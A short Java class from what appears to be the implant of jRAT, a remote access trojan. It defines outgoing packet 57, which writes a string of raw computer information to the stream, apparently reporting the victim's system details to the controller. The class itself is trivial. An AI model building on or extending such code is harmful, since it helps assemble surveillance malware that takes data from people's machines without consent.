package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet57RawComputerInfo extends AbstractOutgoingPacket {

	private String info;

	public Packet57RawComputerInfo(String info) {
		this.info = info;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(info);
	}

	@Override
	public byte getPacketId() {
		return 57;
	}

}
